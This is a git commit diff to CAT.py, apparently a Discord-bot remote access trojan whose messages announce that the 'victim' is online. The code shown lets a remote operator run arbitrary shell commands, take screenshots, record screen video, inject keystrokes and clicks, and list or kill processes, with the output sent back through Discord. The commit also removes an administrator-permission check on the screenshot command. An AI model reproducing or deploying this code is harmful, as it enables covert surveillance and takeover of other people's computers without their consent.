ae361b098d1054f43eca703e11e6cc8cc9c6c717
NullifiedVlad <59374393+NullifiedVlad@users.noreply.github.com>
2020-04-05 19:03:44 +0300

    datetime update

--- CAT.py
+++ CAT.py
@@ -9,12 +9,11 @@ import pyautogui as pg
 import os
 import sys
 import subprocess
-from playsound import playsound
 import numpy as np
 import cv2
 import config
-import datetime
-import time
+from datetime import datetime
+
 
 pg.FAILSAFE = False
 bot = commands.Bot(command_prefix='!') # префикс для комманд
@@ -26,7 +25,7 @@ bot.remove_command('help')
 async def on_ready():
     channel = bot.get_channel(config.channel)
     await channel.send(f'CAT: Жертва онлайн!')
-    date =  datetime.datetime.now()
+    date =  datetime.now()
     await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
 
 @bot.command()
@@ -46,7 +45,6 @@ async def click(ctx): # кликнуть мышкой
 
 
 @bot.command()
-@commands.has_permissions(administrator = True)
 async def screenshot(ctx): # сделать скриншот
     pg.screenshot('screenshot.png')
     await ctx.send(file=discord.File('screenshot.png'))
@@ -63,6 +61,7 @@ async def write(ctx,*,text): # написать текс
     pg.typewrite(text)
     await ctx.send(f"CAT: Был набран текст: {text}")
 
+
 @bot.command()
 async def send(ctx,key,how_many): #нажать клавишу
     a = 0
@@ -70,9 +69,11 @@ async def send(ctx,key,how_many): #нажать клавишу
         pg.press(key)
         a += 1
     await ctx.send(f'CAT: Была нажата клавиша "{key}" {how_many} раза!')
+
 @bot.command()
 async def help(ctx):
     await ctx.send(config.helpmessage,file=discord.File('Banners/Banner.png'))
+    
 @bot.command()
 async def command(ctx,*,command):
     output = os.system(str(command))
@@ -80,6 +81,7 @@ async def command(ctx,*,command):
         await ctx.send('CAT: Комманда успешно выполнена!')
     else:
         await ctx.send('CAT: Ошибка выполения!')
+
 
 @bot.command()
 async def kill(ctx,*,process):
@@ -90,12 +92,9 @@ async def kill(ctx,*,process):
         await ctx.send('CAT: Такого процесса нет!')
 @bot.command()
 async def processlist(ctx):
-    data = subprocess.check_output(['tasklist'],universal_newlines=False)
-    f = open('processlist.txt', 'w')
-    f.write(str(data))
-    f.close()
-    await ctx.send('Открытые процессы:',file=discord.File('processlist.txt'))
-    os.remove('processlist.txt')
+    await ctx.send(subprocess.check_output(['tasklist']))
+
+
 @bot.command()
 async def video(ctx,how_many): #запись видео
     output = 'video.avi'
@@ -120,5 +119,4 @@ async def video(ctx,how_many): #запись видео
     os.remove(output)
     out.release()
     cv2.destroyAllWindows()
-
 bot.run(config.token)
